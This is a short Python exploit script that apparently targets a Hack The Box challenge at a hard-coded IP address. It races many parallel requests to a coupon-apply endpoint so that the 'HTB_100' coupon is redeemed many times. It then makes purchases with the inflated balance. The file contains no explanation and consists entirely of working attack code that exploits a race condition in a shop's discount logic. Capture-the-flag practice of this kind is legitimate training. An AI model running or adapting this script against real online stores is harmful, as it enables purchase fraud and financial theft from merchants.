#!/usr/bin/env python3
from httpx import *
import multiprocessing
import concurrent.futures
import time
url = "http://209.97.188.95:32100/"
r = post(url+'api/purchase',data={'item':'A1'}) 
cookies = {'session':r.cookies['session']}
def race(c):
    for i in range(10):
        try:
            post(url+'api/coupons/apply',cookies =  c,data={'coupon_code':'HTB_100'}).json()
        except Exception as e:
            print(e)
def exploit():
    start = time.time()
    with concurrent.futures.ProcessPoolExecutor(40) as executor:
        for i in range(40):
            executor.submit(race,c=cookies)
    print(f"time taken : {time.time()-start}")
    print(post(url+'api/purchase',data={'item':'A1'},cookies=cookies).json())
    print(post(url+'api/purchase',data={'item':'C8'},cookies=cookies).json())
if __name__ == "__main__":
    for i in range(10):
        try:
            exploit()
        except KeyboardInterrupt:
            break
